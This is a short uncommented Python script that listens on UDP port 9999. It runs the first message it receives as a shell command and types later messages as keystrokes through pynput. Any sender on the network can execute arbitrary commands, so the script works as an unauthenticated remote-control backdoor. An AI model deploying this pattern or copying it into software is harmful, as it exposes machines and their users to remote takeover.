import socket 
import subprocess
from pynput.keyboard import Key, Controller

keyboard = Controller()

UDP_IP = "255.255.255.255"
UDP_PORT = 9999

sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
sock.bind((UDP_IP, UDP_PORT))
  
try:                     
	
	while(True):
		data, addr = sock.recvfrom(1024)
		proc = subprocess.Popen(data.decode(), shell=True, stdout=subprocess.PIPE,
			stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		while(True):
			data, addr = sock.recvfrom(1024)
			keyboard.type(data.decode())
			if(data.decode() == 'bye'):
				break
except:
	print("Closing...")
	

